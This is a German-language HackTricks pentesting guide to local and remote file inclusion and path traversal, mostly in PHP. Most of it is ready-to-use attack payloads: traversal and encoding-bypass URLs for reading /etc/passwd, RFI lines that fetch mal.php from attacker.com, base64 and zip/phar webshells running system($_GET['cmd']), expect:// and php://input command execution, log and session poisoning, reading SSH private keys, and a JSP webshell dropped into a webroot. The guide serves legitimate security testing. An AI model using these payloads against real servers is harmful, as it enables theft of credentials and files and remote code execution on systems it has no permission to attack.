# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Die Datei wird von einem entfernten Server geladen (Am besten: Du kannst den Code schreiben und der Server wird ihn ausführen). In php ist dies standardmäßig **deaktiviert** (**allow_url_include**).\
**Local File Inclusion (LFI):** Der Server lädt eine lokale Datei.

Die Schwachstelle entsteht, wenn ein Benutzer die Datei, die vom Server geladen werden soll, in irgendeiner Form kontrollieren kann.

Anfällige **PHP functions**: require, require_once, include, include_once

Ein interessantes Tool, um diese Schwachstelle auszunutzen: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Durch Kombination mehrerer \*nix LFI-Listen und Hinzufügen weiterer Pfade habe ich diese erstellt:**

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Versuche auch, `/` durch `\` zu ersetzen\
Versuche auch, `../../../../../` hinzuzufügen

Eine Liste, die mehrere Techniken verwendet, um die Datei /etc/password zu finden (um zu prüfen, ob die Verwundbarkeit besteht), findet man [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Zusammenführung verschiedener wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Versuche auch, `/` durch `\` zu ersetzen\
Versuche auch, `C:/` zu entfernen und `../../../../../` hinzuzufügen

Eine Liste, die mehrere Techniken verwendet, um die Datei /boot.ini zu finden (um zu prüfen, ob die Verwundbarkeit besteht), findet man [hier](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Siehe die LFI-Liste für Linux.

## Grundlegendes LFI und Bypasses

Alle Beispiele beziehen sich auf Local File Inclusion, können aber auch auf Remote File Inclusion angewendet werden (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences werden nicht rekursiv entfernt
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass: das Anhängen weiterer Zeichen am Ende des übergebenen Strings umgehen (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Dies ist **seit PHP 5.4 behoben**

### **Encoding**

Du könntest nicht-standardmäßige Encodings wie double URL encode (und andere) verwenden:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Vom vorhandenen Ordner

Möglicherweise überprüft das back-end den Ordnerpfad:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Dateisystemverzeichnisse auf einem Server erkunden

Das Dateisystem eines Servers kann rekursiv durchsucht werden, um Verzeichnisse (nicht nur Dateien) zu identifizieren, indem bestimmte Techniken angewendet werden. Dieser Vorgang umfasst das Bestimmen der Verzeichnistiefe und das Abfragen der Existenz konkreter Ordner. Nachfolgend eine detaillierte Methode, um dies zu erreichen:

1. **Verzeichnistiefe bestimmen:** Ermittele die Tiefe deines aktuellen Verzeichnisses, indem du erfolgreich die `/etc/passwd`-Datei abrufst (anwendbar, wenn der Server Linux-basiert ist). Ein Beispiel-URL könnte wie folgt strukturiert sein und eine Tiefe von drei anzeigen:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Auf Ordner prüfen:** Hänge den Namen des vermuteten Ordners (z. B. `private`) an die URL an, und navigiere dann zurück zu `/etc/passwd`. Die zusätzliche Verzeichnisebene erfordert, die Tiefe um eins zu erhöhen:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Ergebnisse interpretieren:** Die Server-Antwort zeigt an, ob das Verzeichnis existiert:
- **Fehler / Keine Ausgabe:** Das Verzeichnis `private` existiert wahrscheinlich nicht am angegebenen Pfad.
- **Inhalt von `/etc/passwd`:** Das Vorhandensein des Verzeichnisses `private` wird bestätigt.
4. **Rekursive Erkundung:** Gefundene Verzeichnisse können mithilfe derselben Technik oder traditioneller Local File Inclusion (LFI)-Methoden weiter auf Unterverzeichnisse oder Dateien überprüft werden.

Um Verzeichnisse an anderen Orten im Dateisystem zu erkunden, passe die Payload entsprechend an. Um zum Beispiel zu prüfen, ob `/var/www/` ein Verzeichnis `private` enthält (angenommen, das aktuelle Verzeichnis befindet sich auf einer Tiefe von 3), verwende:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation ist eine Methode, um Dateipfade in Webanwendungen zu manipulieren. Sie wird häufig verwendet, um auf eingeschränkte Dateien zuzugreifen, indem bestimmte Sicherheitsmaßnahmen umgangen werden, die zusätzliche Zeichen an das Ende von Dateipfaden anhängen. Ziel ist es, einen Dateipfad zu erstellen, der, nachdem die Sicherheitsmaßnahme ihn verändert hat, immer noch auf die gewünschte Datei zeigt.

In PHP können verschiedene Darstellungen eines Dateipfads aufgrund der Natur des Dateisystems als äquivalent betrachtet werden. Zum Beispiel:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, und `/etc/passwd/` werden alle als derselbe Pfad behandelt.
- Wenn die letzten 6 Zeichen `passwd` sind, ändert das Anhängen eines `/` (dadurch `passwd/`) die Ziel-Datei nicht.
- Ebenso, wenn `.php` an einen Dateipfad angehängt wird (wie `shellcode.php`), ändert das Hinzufügen von `/.` am Ende nicht die aufgerufene Datei.

Die folgenden Beispiele zeigen, wie man Path truncation nutzt, um auf `/etc/passwd` zuzugreifen, ein häufiges Ziel wegen seines sensiblen Inhalts (Benutzerkontoinformationen):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
In diesen Szenarien könnte die Anzahl der benötigten Traversals bei etwa 2027 liegen, aber diese Zahl kann je nach Konfiguration des Servers variieren.

- **Verwendung von Dot Segments und zusätzlichen Zeichen**: Traversal-Sequenzen (`../`) kombiniert mit zusätzlichen Punktsegmenten und Zeichen können verwendet werden, um im Dateisystem zu navigieren und angehängte Zeichenketten des Servers effektiv zu ignorieren.
- **Bestimmung der benötigten Anzahl an Traversals**: Durch Versuch und Irrtum kann man die genaue Anzahl von `../`-Sequenzen herausfinden, die nötig ist, um zum Root-Verzeichnis und anschließend zu `/etc/passwd` zu gelangen, wobei sichergestellt wird, dass angehängte Strings (wie `.php`) neutralisiert werden, aber der gewünschte Pfad (`/etc/passwd`) erhalten bleibt.
- **Mit einem falschen Verzeichnis beginnen**: Es ist gängige Praxis, den Pfad mit einem nicht existierenden Verzeichnis (z. B. `a/`) zu beginnen. Diese Technik wird als Vorsichtsmaßnahme oder um die Anforderungen der Pfadparsing-Logik des Servers zu erfüllen eingesetzt.

Beim Einsatz von path truncation techniques ist es entscheidend, das Pfadparsing-Verhalten des Servers und die Struktur des Dateisystems zu verstehen. Jedes Szenario kann einen anderen Ansatz erfordern, und Tests sind oft notwendig, um die effektivste Methode zu finden.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

In php ist das standardmäßig deaktiviert, weil **`allow_url_include`** auf **Off** steht. Es muss auf **On** gesetzt sein, damit es funktioniert, und in diesem Fall könntest du eine PHP-Datei von deinem Server einbinden und RCE erreichen:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Wenn aus irgendeinem Grund **`allow_url_include`** auf **On** steht, PHP den Zugriff auf externe Webseiten aber **filtert**, [laut diesem Beitrag](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) kann man zum Beispiel das data-Protokoll mit base64 verwenden, um b64 PHP-Code zu dekodieren und RCE zu erlangen:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Im vorherigen Code wurde das abschließende `+.txt` hinzugefügt, weil der Angreifer einen String benötigte, der auf `.txt` endet. Der String endet damit, und nach dem b64 decode wird dieser Teil nur Müll zurückgeben und der eigentliche PHP-Code eingebunden (und somit ausgeführt).

Ein weiteres Beispiel **das nicht das `php://`-Protokoll verwendet** wäre:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Root-Element

In Python in einem Code wie diesem:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Wenn der Benutzer einen **absoluten Pfad** an **`file_name`** übergibt, wird der **vorherige Pfad einfach entfernt**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Es ist das beabsichtigte Verhalten laut [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.

## Java Verzeichnisse auflisten

Es sieht so aus, dass wenn du einen Path Traversal in Java hast und du **nach einem Verzeichnis fragst** statt nach einer Datei, eine **Auflistung des Verzeichnisses zurückgegeben** wird. Das wird in anderen Sprachen nicht passieren (afaik).

## Top 25 Parameter

Hier ist eine Liste der Top-25-Parameter, die anfällig für local file inclusion (LFI) vulnerabilities sein könnten (von [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP-Filters erlauben grundlegende **Modifikationsoperationen an den Daten**, bevor sie gelesen oder geschrieben werden. Es gibt 5 Kategorien von Filtern:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Entfernt Tags aus den Daten (alles zwischen den Zeichen "<" und ">")
- Beachte, dass dieser Filter in modernen PHP-Versionen nicht mehr vorhanden ist
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Wandelt in eine andere Kodierung um (`convert.iconv.<input_enc>.<output_enc>`). Um die **Liste aller unterstützten Kodierungen** zu erhalten, führe in der Konsole aus: `iconv -l`

> [!WARNING]
> Durch Missbrauch des `convert.iconv.*` Konvertierungsfilters kannst du **beliebigen Text erzeugen**, was nützlich sein kann, um beliebigen Text zu schreiben oder Funktionen wie include dazu zu bringen, beliebigen Text zu verarbeiten. Für mehr Infos siehe [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Komprimiert den Inhalt (nützlich, wenn viel Information exfiltriert werden soll)
- `zlib.inflate`: Dekomprimiert die Daten
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : veraltet
- `mdecrypt.*` : veraltet
- Other Filters
- Wenn man in php `var_dump(stream_get_filters());` ausführt, findet man ein paar **unerwartete Filter**:
- `consumed`
- `dechunk`: kehrt HTTP chunked encoding um
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Der Teil "php://filter" ist nicht case-sensitiv

### Using php filters as oracle to read arbitrary files

[**In diesem Beitrag**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) wird eine Technik vorgeschlagen, um eine lokale Datei zu lesen, ohne dass die Ausgabe vom Server zurückgegeben wird. Diese Technik basiert auf einer **boolean exfiltration der Datei (char für char) unter Verwendung von php filters** als oracle. Das liegt daran, dass php filters verwendet werden können, um einen Text so zu vergrößern, dass php eine Exception wirft.

Im Originalbeitrag findet sich eine ausführliche Erklärung der Technik, hier eine kurze Zusammenfassung:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- This will be used to generate a **text so big when the initial letter is guessed correctly** that php will trigger an **error**
- The **dechunk** filter will **remove everything if the first char is not an hexadecimal**, so we can know if the first char is hex.
- This, combined with the previous one (and other filters depending on the guessed letter), will allow us to guess a letter at the beggining of the text by seeing when we do enough transformations to make it not be an hexadecimal character. Because if hex, dechunk won't delete it and the initial bomb will make php error.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- Using other transformations like **rot13** at the beginning it’s possible to leak other chars like n, o, p, q, r (and other codecs can be used to move other letters to the hex range).
- When the initial char is a number it’s needed to base64 encode it and leak the 2 first letters to leak the number.
- The final problem is to see **how to leak more than the initial letter**. By using order memory filters like **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is possible to change the order of the chars and get in the first position other letters of the text.
- And in order to be able to obtain **further data** the idea if to **generate 2 bytes of junk data at the beginning** with **convert.iconv.UTF16.UTF16**, apply **UCS-4LE** to make it **pivot with the next 2 bytes**, and d**elete the data until the junk data** (this will remove the first 2 bytes of the initial text). Continue doing this until you reach the disired bit to leak.

Im Beitrag wurde auch ein Tool veröffentlicht, das dies automatisiert: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Dieser Wrapper erlaubt den Zugriff auf File-Deskriptoren, die der Prozess geöffnet hat. Potenziell nützlich, um den Inhalt geöffneter Dateien zu exfiltrate:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Du kannst auch **php://stdin, php://stdout und php://stderr** verwenden, um jeweils auf die **Dateideskriptoren 0, 1 und 2** zuzugreifen (nicht sicher, wie das in einem Angriff nützlich sein könnte)

### zip:// and rar://

Lade eine Zip- oder Rar-Datei mit einer PHPShell darin hoch und greife darauf zu.\
Um das rar-Protokoll missbrauchen zu können, **muss es speziell aktiviert werden**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Beachte, dass dieses Protokoll durch die php-Konfigurationen **`allow_url_open`** und **`allow_url_include`** eingeschränkt ist

### expect://

Expect muss aktiviert sein. Du kannst Code damit ausführen:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Geben Sie Ihr Payload in den POST-Parametern an:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Eine `.phar`-Datei kann verwendet werden, um PHP-Code auszuführen, wenn eine Webanwendung Funktionen wie `include` zum Laden von Dateien nutzt. Der unten stehende PHP-Code zeigt die Erstellung einer `.phar`-Datei:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Zum Kompilieren der `.phar`-Datei muss der folgende Befehl ausgeführt werden:
```bash
php --define phar.readonly=0 create_path.php
```
Beim Ausführen wird eine Datei namens `test.phar` erstellt, die potenziell zur Ausnutzung von Local File Inclusion (LFI) vulnerabilities verwendet werden kann.

Wenn das LFI nur Dateilesen durchführt, ohne den darin enthaltenen PHP-Code auszuführen — etwa über Funktionen wie `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` oder `filesize()` — kann versucht werden, eine deserialization vulnerability auszunutzen. Diese Schwachstelle hängt mit dem Lesen von Dateien über das `phar`-Protokoll zusammen.

Für ein detailliertes Verständnis der Ausnutzung von deserialization vulnerabilities im Kontext von `.phar`-Dateien siehe das unten verlinkte Dokument:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Es war möglich, **any arbitrary file read from PHP that supports php filters** zu missbrauchen, um eine RCE zu erreichen. Die detaillierte Beschreibung kann [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Sehr kurze Zusammenfassung: ein **3 byte overflow** im PHP-Heap wurde missbraucht, um **alter the chain of free chunks** einer bestimmten Größe zu verändern, um **write anything in any address** zu ermöglichen, sodass ein Hook hinzugefügt wurde, der **`system`** aufruft.\
Es war möglich, Chunks spezifischer Größe zu allocaten, indem weitere php filters missbraucht wurden.

### More protocols

Siehe weitere mögliche[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Schreiben in memory oder in eine temporäre Datei (nicht sicher, wie das in einem file inclusion attack nützlich sein kann)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Zugriff auf das lokale Dateisystem
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Zugriff auf HTTP(s)-URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Zugriff auf FTP(s)-URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Kompressions-Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Findet Pfadnamen, die dem Muster entsprechen (gibt nichts Printbares zurück, daher hier nicht wirklich nützlich)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (nicht nützlich, um beliebige Dateien zu lesen)

## LFI via PHP's 'assert'

Die Risiken von Local File Inclusion (LFI) in PHP sind besonders hoch, wenn die 'assert'-Funktion verwendet wird, da sie Code innerhalb von Strings ausführen kann. Das ist besonders problematisch, wenn Input, der directory traversal characters wie ".." enthält, geprüft aber nicht korrekt bereinigt wird.

Zum Beispiel könnte PHP-Code so gestaltet sein, um directory traversal zu verhindern:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Während dies darauf abzielt, traversal zu verhindern, schafft es unbeabsichtigt einen Vektor für code injection. Um dies zum Lesen von Dateiinhalten auszunutzen, könnte ein Angreifer Folgendes verwenden:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Ähnlich kann man zum Ausführen beliebiger Systembefehle beispielsweise Folgendes verwenden:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Diese Technik ist relevant in Fällen, in denen du den **Dateipfad** einer **PHP-Funktion** **kontrollierst**, die auf eine **Datei zugreift**, du aber den Inhalt der Datei nicht sehen wirst (z. B. ein einfacher Aufruf von **`file()`**).

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) wird erklärt, wie ein blindes Path Traversal über PHP-Filter missbraucht werden kann, um **exfiltrate the content of a file via an error oracle**.

Kurz gesagt verwendet die Technik die **"UCS-4LE" encoding**, um den Inhalt einer Datei so **groß** zu machen, dass die **PHP-Funktion, die die Datei öffnet**, einen **Fehler** auslöst.

Dann wird, um das erste Zeichen zu leak, der Filter **`dechunk`** zusammen mit anderen wie **base64** oder **rot13** verwendet; schließlich werden die Filter **convert.iconv.UCS-4.UCS-4LE** und **convert.iconv.UTF16.UTF-16BE** eingesetzt, um andere Zeichen an den Anfang zu platzieren und sie zu leak.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Für die technischen Details siehe den erwähnten Beitrag!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Wenn serverseitiger Code, der Dateien verarbeitet/hochlädt, den Zielpfad unter Verwendung von vom Benutzer kontrollierten Daten (z. B. einem Dateinamen oder einer URL) ohne Kanonisierung und Validierung zusammenbaut, können `..`-Segmente und absolute Pfade aus dem vorgesehenen Verzeichnis entkommen und ein beliebiges Schreiben von Dateien verursachen. Wenn du das payload in ein web-exponiertes Verzeichnis platzieren kannst, erhältst du normalerweise unauthentifizierte RCE, indem du einen webshell ablegst.

Typischer Exploit-Ablauf:
- Identifiziere eine Schreib-Primitive in einem Endpoint oder Hintergrund-Worker, der einen Pfad/Dateinamen akzeptiert und Inhalt auf die Festplatte schreibt (z. B. message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Bestimme web-exponierte Verzeichnisse. Häufige Beispiele:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → `shell.jsp` ablegen
- IIS: `C:\inetpub\wwwroot\` → `shell.aspx` ablegen
- Erzeuge einen Traversal-Pfad, der aus dem vorgesehenen Speicherverzeichnis in das webroot ausbricht, und füge deinen webshell-Inhalt ein.
- Rufe das abgelegte payload im Browser auf und führe Befehle aus.

Hinweise:
- Der verwundbare Dienst, der das Schreiben durchführt, kann auf einem Nicht-HTTP-Port lauschen (z. B. ein JMF XML Listener auf TCP 4004). Das Hauptwebportal (anderer Port) wird später dein payload ausliefern.
- Bei Java-Stacks werden solche Dateischreibvorgänge oft mit einfacher `File`/`Paths`-Konkatenation implementiert. Fehlende Kanonisierung/Allow-Listing ist die Kernschwachstelle.

Generisches XML/JMF-artiges Beispiel (Produkt-Schemata variieren – der DOCTYPE/body wrapper ist für den Traversal irrelevant):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Härtung, die diese Fehlerklasse verhindert:
- Auf einen kanonischen Pfad auflösen und sicherstellen, dass er ein Nachfahre eines allow-listeten Basisverzeichnisses ist.
- Jeden Pfad ablehnen, der `..`, absolute Roots oder Laufwerksbuchstaben enthält; bevorzugt generierte Dateinamen.
- Den Writer als low-privileged Account ausführen und Schreibverzeichnisse von den served roots trennen.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Note that **if you use double quotes** for the shell instead of **simple quotes**, the double quotes will be modified for the string "_**quote;**_", **PHP will throw an error** there and **nothing else will be executed**.
>
> Also, make sure you **write correctly the payload** or PHP will error every time it tries to load the log file and you won't have a second opportunity.

This could also be done in other logs but **be careful,** the code inside the logs could be URL encoded and this could destroy the Shell. The header **authorisation "basic"** contains "user:password" in Base64 and it is decoded inside the logs. The PHPShell could be inserted inside this header.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Per E-Mail

**Sende eine Mail** an ein internes Konto (user@localhost), die deinen PHP payload wie `<?php echo system($_REQUEST["cmd"]); ?>` enthält, und versuche, die Mail des Nutzers mit einem Pfad wie **`/var/mail/<USERNAME>`** oder **`/var/spool/mail/<USERNAME>`** zu include.

### Über /proc/*/fd/*

1. Upload a lot of shells (zum Beispiel: 100)  
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), wobei $PID die PID des Prozesses ist (can be brute forced) und $FD der file descriptor (can be brute forced too)

### Über /proc/self/environ

Wie eine Logdatei: sende das payload im User-Agent — es wird in der Datei /proc/self/environ reflektiert.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Wenn du eine Datei uploaden kannst, injiziere einfach die shell payload darin (z. B.: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Um die Datei lesbar zu halten, ist es am besten, sie in die Metadaten der Bilder/doc/pdf zu injizieren

### Via ZIP-Datei-Upload

Lade eine ZIP-Datei hoch, die eine komprimierte PHP shell enthält, und rufe sie auf:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Über PHP sessions

Prüfe, ob die Website PHP Session (PHPSESSID) verwendet.
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP werden diese Sessions in _/var/lib/php5/sess\\_\[PHPSESSID]\_ Dateien gespeichert
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Setze das Cookie auf `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Verwende das LFI, um die PHP-Session-Datei einzubinden.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Über ssh

Wenn ssh aktiv ist, prüfe, welcher Benutzer verwendet wird (/proc/self/status & /etc/passwd) und versuche, auf **\<HOME>/.ssh/id_rsa** zuzugreifen

### **Über** **vsftpd** _**logs**_

Die Logs des FTP-Servers vsftpd befinden sich unter _**/var/log/vsftpd.log**_. Falls eine Local File Inclusion (LFI)-Schwachstelle besteht und Zugriff auf einen exponierten vsftpd-Server möglich ist, können folgende Schritte in Betracht gezogen werden:

1. Injiziere ein PHP-Payload in das Username-Feld während des Login-Vorgangs.
2. Nach der Injection nutze die LFI, um die Server-Logs von _**/var/log/vsftpd.log**_ auszulesen.

